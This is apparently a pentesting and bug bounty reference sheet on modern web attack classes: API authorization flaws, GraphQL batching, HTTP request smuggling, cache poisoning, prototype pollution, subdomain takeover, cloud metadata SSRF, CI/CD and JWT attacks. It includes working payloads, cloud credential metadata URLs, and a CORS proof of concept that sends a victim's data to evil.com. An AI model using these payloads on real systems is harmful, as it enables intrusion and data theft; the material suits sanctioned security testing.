# Modern Attack Techniques Reference

Attack classes that are increasingly common in pentesting engagements and bug bounty. These go beyond the classic OWASP Top 10 and target modern application architectures.

---

## API Security

### REST API Attacks

**Authorization testing:**
- Test every endpoint with no token, expired token, other user's token, lower-privilege token
- Check for BOLA (Broken Object-Level Authorization) — change object IDs in every request
- Check for BFLA (Broken Function-Level Authorization) — try admin endpoints as regular user
- Test HTTP method switching: if GET works, try PUT/DELETE/PATCH on same endpoint

**Mass assignment:**
```json
// Normal request
POST /api/users
{"name": "test", "email": "test@test.com"}

// Try adding admin fields
POST /api/users
{"name": "test", "email": "test@test.com", "role": "admin", "isAdmin": true}
```

**Rate limiting & resource exhaustion:**
- Test pagination: `?page=1&per_page=999999`
- Test with no rate limiting on sensitive endpoints (login, password reset, OTP)
- Check if rate limits are per-IP, per-user, or per-session (bypass with X-Forwarded-For)

**API versioning:**
- Try `/api/v1/` when current is `/api/v2/` — older versions often lack security patches
- Try `/api/internal/`, `/api/debug/`, `/api/admin/`

### GraphQL Attacks

**Introspection (information disclosure):**
```graphql
{__schema{types{name,fields{name,type{name}}}}}
```
If introspection is disabled, try field suggestion abuse — send invalid field names and observe error messages.

**Batching attacks (rate limit bypass):**
```json
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token }}"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token }}"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token }}"}
]
```

**Nested query DoS:**
```graphql
{ user(id:1) { friends { friends { friends { friends { name }}}}}}
```

**Authorization bypass:**
- Query objects through alternative paths (e.g., access user data via `organization → members → user` instead of direct `user` query)
- Test mutations with other users' node IDs

### gRPC Attacks
- Use `grpcurl` for enumeration if reflection is enabled
- Test for lack of authentication on service methods
- Protobuf manipulation — decode, modify, re-encode messages
- Check for unvalidated message fields

### WebSocket Attacks
- Test for CSWSH (Cross-Site WebSocket Hijacking) — missing Origin validation
- Inject into WebSocket messages (XSS, SQLi through WS payloads)
- Test authentication — are WS connections authenticated after initial handshake?
- Replay attacks — can old messages be replayed?

---

## HTTP Request Smuggling

Exploits differences in how front-end (reverse proxy/CDN) and back-end servers parse HTTP requests.

**Why it matters:** Can bypass security controls, poison web caches, hijack other users' requests, achieve XSS without user interaction.

### Detection
```bash
# CL.TE detection
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G

# TE.CL detection
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

1
G
0


```

If the response differs from a normal request, smuggling may be possible.

### Tools
- Burp Suite (HTTP Request Smuggler extension)
- `smuggler.py` — automated detection
- Manual testing with raw sockets (don't rely on HTTP libraries — they "fix" malformed requests)

### Key variants
| Type | Front-end uses | Back-end uses |
|------|---------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Transfer-Encoding | Transfer-Encoding (with obfuscation) |
| H2.CL | HTTP/2 | Content-Length (HTTP/1.1 downgrade) |

### Impact chains
- Smuggle request to poison cache → reflected XSS for all users
- Smuggle request to capture next user's request → session hijacking
- Bypass WAF/IP restrictions

---

## Web Cache Poisoning

Exploit caching mechanisms to serve malicious content to other users.

**Detection:**
1. Identify unkeyed inputs — headers/parameters not included in cache key
2. Test with cache-buster to avoid affecting real users: `?cachebust=abc123`
3. Common unkeyed inputs: `X-Forwarded-Host`, `X-Original-URL`, `X-Forwarded-Scheme`

**Example:**
```
GET /page?cachebust=abc HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
If response includes `evil.com` in a script src or link, and that response gets cached, all subsequent users get the poisoned version.

### Tools
- Param Miner (Burp extension) — discovers unkeyed parameters
- Manual testing with `Pragma: no-cache` to force cache miss

---

## Prototype Pollution

JavaScript-specific vulnerability. Modifying `Object.prototype` affects all objects in the application.

**Server-side (Node.js):**
```json
// Merge/extend operations are vulnerable
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**Client-side:**
```
https://target.com/page?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

**Where to look:**
- Any endpoint that deep-merges user input (settings, preferences, profiles)
- URL query parameter parsing libraries
- JSON body processing in Node.js/Express

**Impact:** Can chain to RCE (server-side) or XSS (client-side) depending on how polluted properties are used.

---

## Subdomain Takeover

When a subdomain's DNS points to a service (S3, Heroku, GitHub Pages, Azure, etc.) that no longer exists or is unclaimed.

**Detection:**
```bash
# Find dangling CNAMEs
dig CNAME sub.target.com
# If CNAME points to service and service returns "not found" / 404 → takeover candidate

# Automated tools
subjack -w subdomains.txt -t 100
nuclei -t takeovers/ -l subdomains.txt
can-i-take-over-xyz  # GitHub reference for service fingerprints
```

**Common vulnerable services:**
| Service | Fingerprint |
|---------|------------|
| AWS S3 | "NoSuchBucket" |
| GitHub Pages | "There isn't a GitHub Pages site here" |
| Heroku | "No such app" |
| Azure | "404 Web Site not found" |
| Shopify | "Sorry, this shop is currently unavailable" |
| Fastly | "Fastly error: unknown domain" |

---

## Cloud-Specific Attacks

### AWS
- **SSRF → metadata:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - IMDSv2 requires token header — test if IMDSv1 is still enabled
- **S3 bucket misconfiguration:**
  ```bash
  aws s3 ls s3://target-bucket --no-sign-request
  aws s3 cp s3://target-bucket/sensitive.txt . --no-sign-request
  ```
- **Lambda function URLs:** Check for unauthenticated function URLs
- **Cognito misconfiguration:** Self-signup enabled, unverified attributes

### Azure
- **Blob storage:** `https://<account>.blob.core.windows.net/<container>?restype=container&comp=list`
- **Azure AD:** Enumerate users via `https://login.microsoftonline.com/<tenant>/.well-known/openid-configuration`
- **Managed Identity SSRF:** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

### GCP
- **Metadata:** `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header)
- **Storage buckets:** `https://storage.googleapis.com/<bucket>/`

---

## CI/CD Pipeline Attacks

When you find access to CI/CD systems (Jenkins, GitHub Actions, GitLab CI):

- **Secret extraction:** Environment variables in build logs, debug output
- **Pipeline poisoning:** Modify CI config to exfiltrate secrets or inject into builds
- **Self-hosted runners:** Often have access to internal networks and cloud credentials
- **Dependency confusion:** Internal package names that can be registered on public registries
- **GitHub Actions:** Check for `pull_request_target` with checkout of PR code (code injection)

---

## CORS Misconfiguration

Beyond basic "Access-Control-Allow-Origin: *":

**Reflected origin:**
```bash
curl -H "Origin: https://evil.com" https://target.com/api/user
# If response has Access-Control-Allow-Origin: https://evil.com → vulnerable
```

**Null origin bypass:**
```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://target.com/api/user', {credentials:'include'})
.then(r=>r.json()).then(d=>fetch('https://evil.com/steal?d='+JSON.stringify(d)))
</script>
"></iframe>
```

**Subdomain trust:** If `*.target.com` is trusted, XSS on any subdomain → CORS bypass.

---

## JWT Attacks

| Attack | When to try |
|--------|------------|
| `alg: none` | Always — classic but still found |
| Key confusion (RS256 → HS256) | When public key is available |
| `kid` injection | When JWT has `kid` header |
| `jku`/`x5u` header injection | When JWT references external key URL |
| Expired token acceptance | Always check if expiry is enforced |
| Weak secret brute force | `hashcat -m 16500 jwt.txt wordlist.txt` |

Tools: jwt_tool, jwt.io, hashcat
